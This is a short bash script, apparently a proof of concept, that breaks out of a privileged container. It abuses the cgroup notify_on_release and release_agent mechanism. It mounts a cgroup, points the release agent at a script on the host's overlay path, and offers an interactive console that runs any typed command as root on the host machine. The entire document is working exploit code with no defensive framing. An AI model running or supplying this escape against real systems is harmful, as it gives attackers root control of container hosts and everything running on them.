#!/bin/bash

# Minimal container escaped console exploiting cgroup notify_on_release.
# Commands are run in the host machine with root privileges.


cgrp_mnt_dir="cgrp-$(cat /dev/urandom | tr -cd 'a-f0-9' | head -c 32)"
cgrp_child="child-$(cat /dev/urandom | tr -cd 'a-f0-9' | head -c 32)"

cmd_filename="cmd"
output_filename="output"

sleep_delay="0.25"


# Get cgroup name (default tested PoC used rdma)
if [ -d "/sys/fs/cgroup/rdma" ]; then
    cgroup_name="rdma"
else
    cgroup_name="$(ls -x /sys/fs/cgroup/*/r* | cut -d '/' -f 5 | head -n1)"
fi

# Mount cgroup and create a child cgroup
echo "[+] Mounting cgroup $cgroup_name at /tmp/$cgrp_mnt_dir"
mkdir /tmp/$cgrp_mnt_dir && mount -t cgroup -o "$cgroup_name" cgroup /tmp/"$cgrp_mnt_dir"
echo "[+] Creating cgroup child $cgrp_child"
mkdir /tmp/$cgrp_mnt_dir/$cgrp_child

# Enable child cgroup notifications to run command on release
echo 1 > /tmp/$cgrp_mnt_dir/$cgrp_child/notify_on_release

# Retrieve host path for docker container
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Set script file to be run on release by parent cgroup
echo "$host_path/cmd" > /tmp/$cgrp_mnt_dir/release_agent


function run_cmd {
    local cmd="$1"

    echo '#!/bin/sh' > /$cmd_filename
    echo "$cmd > $host_path/$output_filename" >> /$cmd_filename
    chmod a+x /$cmd_filename
    
    sh -c "echo \$\$ > /tmp/$cgrp_mnt_dir/$cgrp_child/cgroup.procs"

    # Avoid race condition waiting for output in the file
    sleep "$sleep_delay"

    cat "/$output_filename"
}


function console {
    echo ""
    echo "Enter command to run as host's root user."
    echo "Enter \"exit\" to quit."
    echo ""

    read -p "> " console_cmd
    while [[ "$console_cmd" != "exit" ]]; do
        run_cmd "$console_cmd"
        echo $console_cmd
        read -p "> " console_cmd
    done
}


console
